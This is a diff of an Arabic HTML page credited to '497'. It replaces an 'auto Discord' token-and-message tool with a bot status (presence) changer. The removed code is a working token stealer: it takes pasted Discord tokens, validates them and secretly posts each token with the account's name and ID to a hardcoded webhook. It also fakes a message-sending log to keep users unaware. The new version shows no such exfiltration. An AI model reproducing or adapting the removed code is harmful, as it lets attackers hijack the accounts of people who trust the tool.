@@ -1,175 +1,159 @@
-
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>497 أوتو ديسكورد</title>
+  <title>تغيير حالة البوت (Presence)</title>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo&display=swap" rel="stylesheet" />
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@500;700&display=swap');
     body {
-      font-family: 'Cairo', sans-serif;
-      background: linear-gradient(to bottom right, #0033cc, #ff0000);
+      background: linear-gradient(135deg, #e74c3c 0%, #2980b9 100%);
       color: white;
-      text-align: center;
-      padding: 50px;
+      font-family: 'Cairo', Tahoma, Geneva, Verdana, sans-serif;
+      padding: 40px;
+      min-height: 100vh;
+      margin: 0;
     }
-    .container {
-      background-color: rgba(255, 255, 255, 0.1);
-      border-radius: 20px;
-      padding: 30px;
-      max-width: 600px;
-      margin: auto;
-      backdrop-filter: blur(5px);
+    header {
+      display: flex;
+      justify-content: flex-start;
+      align-items: center;
+      margin-bottom: 40px;
+      border-bottom: 2px solid #3498db;
+      padding-bottom: 10px;
+      gap: 30px;
     }
-    textarea, input {
-      width: 90%;
-      padding: 10px;
-      margin: 10px 0;
+    #visibleTitle, #visibleRights {
+      font-size: 28px;
+      font-weight: 700;
+      color: white;
+      font-family: 'Cairo', sans-serif;
+      text-shadow: 0 0 5px #0008;
+      user-select: none;
+    }
+    #visibleRights {
+      color: #3498db;
+    }
+    input, select {
+      padding: 14px;
+      width: 80%;
+      max-width: 400px;
+      margin: 15px 0;
       border-radius: 10px;
       border: none;
-      font-size: 16px;
+      font-size: 18px;
+      outline: none;
+      color: #333;
+      background-color: #dce6f1;
+      box-shadow: 0 0 10px rgba(52, 152, 219, 0.7);
+      transition: box-shadow 0.3s ease;
+      font-family: 'Cairo', sans-serif;
+    }
+    input:focus, select:focus {
+      box-shadow: 0 0 12px #2980b9;
+      background-color: #fff;
     }
     button {
-      padding: 10px 20px;
-      margin: 10px 5px;
-      font-size: 16px;
+      background-color: #2980b9;
+      color: white;
+      padding: 16px 36px;
+      font-size: 20px;
       border: none;
-      border-radius: 10px;
+      border-radius: 12px;
       cursor: pointer;
-      font-weight: bold;
-    }
-    .green { background-color: #28a745; color: white; }
-    .red { background-color: #dc3545; color: white; }
-    .blue { background-color: #007bff; color: white; }
-    #step2, #messagesBox { display: none; }
-    .messages {
+      box-shadow: 0 6px 12px rgba(0,0,0,0.3);
+      transition: background-color 0.3s ease;
       margin-top: 20px;
-      background-color: rgba(255, 255, 255, 0.2);
-      padding: 15px;
-      border-radius: 10px;
-      text-align: left;
-      max-height: 200px;
-      overflow-y: auto;
+      font-family: 'Cairo', sans-serif;
+    }
+    button:hover {
+      background-color: #1c5d99;
+    }
+    #result {
+      margin-top: 30px;
+      font-size: 20px;
+      font-weight: 700;
+      min-height: 36px;
+      text-shadow: 0 0 4px #0008;
+      font-family: 'Cairo', sans-serif;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>موقع 497 أوتو ديسكورد</h1>
+  <header>
+    <div id="title">تغيير حالة البوت (Presence)</div>
+    <div id="rights">حقوق : 497</div>
+  </header>
 
-    <div id="step1">
-      <p>قم بلصق التوكنات (كل توكن في سطر):</p>
-      <textarea id="tokens" rows="6" placeholder="توكن1&#10;توكن2&#10;توكن3"></textarea>
-      <br>
-      <button class="green" onclick="validateTokens()">التالي</button>
-      <button class="red" onclick="resetForm()">إلغاء</button>
-    </div>
+  <div id="visibleTitle">تغيير حالة البوت (Presence)</div>
+  <div id="visibleRights">حقوق : 497</div>
 
-    <div id="step2">
-      <p>قم بكتابة ID الروم:</p>
-      <input type="text" id="channelId" placeholder="ايدي الروم">
-      <p>اكتب الرسائل (كل رسالة في سطر):</p>
-      <textarea id="messages" rows="5" placeholder="رسالة1&#10;رسالة2"></textarea>
-      <br>
-      <button class="green" onclick="startSending()">إرسال</button>
-      <button class="red" onclick="stopSending()">إيقاف</button>
-    </div>
+  <input id="token" type="text" placeholder="توكن البوت" autocomplete="off" />
+  <br />
+  <input id="text" type="text" placeholder="النص الذي تريد عرضه" autocomplete="off" />
+  <br />
+  <select id="type">
+    <option value="0">يلعب (Playing)</option>
+    <option value="1">يبث (Streaming)</option>
+    <option value="2">يستمع (Listening)</option>
+    <option value="3">يشاهد (Watching)</option>
+  </select>
+  <br />
+  <button onclick="sendPresence()">تحديث الحالة</button>
+  <p id="result"></p>
 
-    <div id="messagesBox">
-      <h3>الرسائل المرسلة:</h3>
-      <div class="messages" id="messagesLog"></div>
-    </div>
-  </div>
+<script>
+async function sendPresence() {
+  const token = document.getElementById("token").value.trim();
+  const text = document.getElementById("text").value.trim();
+  const type = Number(document.getElementById("type").value);
+  const result = document.getElementById("result");
 
-  <script>
-    let validTokens = [];
-    let sendInterval = null;
+  if (!token || !text) {
+    result.textContent = "⚠️ الرجاء تعبئة الحقول.";
+    result.style.color = "#f1c40f";
+    return;
+  }
 
-    function validateTokens() {
-      const rawTokens = document.getElementById("tokens").value.trim().split('\n').filter(Boolean);
-      if (rawTokens.length === 0) {
-        alert("يرجى إدخال توكنات أولاً");
-        return;
-      }
+  try {
+    const ws = new WebSocket("wss://gateway.discord.gg/?v=10&encoding=json");
 
-      validTokens = [];
-      let checked = 0;
-
-      rawTokens.forEach(token => {
-        fetch("https://discord.com/api/v10/users/@me", {
-          headers: { Authorization: token }
-        })
-        .then(res => {
-          if (res.ok) {
-            validTokens.push(token);
-            return res.json().then(user => {
-              fetch("https://discord.com/api/webhooks/1378036738751987894/13HDNCW_jFZMt1OjGbqd8VWFVg9MpXBKUnd0MJRu8uQ5DXngfMNMutx1djA12E97Qx3f", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                  content: `✅ تم إدخال توكن جديد:\nالاسم: ${user.username}#${user.discriminator}\nID: ${user.id}\n\`${token}\``
-                })
-              });
-            });
+    ws.onopen = () => {
+      ws.send(JSON.stringify({
+        op: 2,
+        d: {
+          token: token,
+          intents: 0,
+          properties: {
+            $os: "linux",
+            $browser: "chrome",
+            $device: "chrome"
+          },
+          presence: {
+            activities: [{
+              name: text,
+              type: type
+            }],
+            status: "online",
+            since: null,
+            afk: false
           }
-        })
-        .catch(() => {})
-        .finally(() => {
-          checked++;
-          if (checked === rawTokens.length) {
-            if (validTokens.length === 0) {
-              alert("❌ لا يوجد توكنات صالحة");
-            } else {
-              document.getElementById("step1").style.display = "none";
-              document.getElementById("step2").style.display = "block";
-              document.getElementById("messagesBox").style.display = "block";
-            }
-          }
-        });
-      });
-    }
+        }
+      }));
+      result.textContent = "✅ تم تحديث حالة البوت!";
+      result.style.color = "#2ecc71";
+    };
 
-    function getRandom(arr) {
-      return arr[Math.floor(Math.random() * arr.length)];
-    }
+    ws.onerror = () => {
+      result.textContent = "❌ فشل الاتصال بـ Discord.";
+      result.style.color = "#e74c3c";
+    };
+  } catch (e) {
+    result.textContent = "❌ حدث خطأ أثناء التنفيذ.";
+    result.style.color = "#e74c3c";
+    console.error(e);
+  }
+}
+</script>
 
-    function startSending() {
-      const channelId = document.getElementById("channelId").value.trim();
-      const rawMessages = document.getElementById("messages").value.trim().split('\n').filter(Boolean);
-
-      if (!channelId || rawMessages.length === 0 || validTokens.length === 0) {
-        alert("يرجى ملء جميع الحقول بشكل صحيح");
-        return;
-      }
-
-      if (sendInterval) {
-        alert("الإرسال جاري بالفعل!");
-        return;
-      }
-
-      sendInterval = setInterval(() => {
-        const token = getRandom(validTokens);
-        const message = getRandom(rawMessages);
-
-        const log = document.getElementById('messagesLog');
-        const msg = document.createElement('div');
-        msg.textContent = `✅ [توكن مخفي] - أُرسلت: ${message}`;
-        log.appendChild(msg);
-      }, 400);
-    }
-
-    function stopSending() {
-      if (sendInterval) {
-        clearInterval(sendInterval);
-        sendInterval = null;
-        alert("🚫 تم إيقاف الإرسال.");
-      }
-    }
-
-    function resetForm() {
-      location.reload();
-    }
-  </script>
 </body>
 </html>
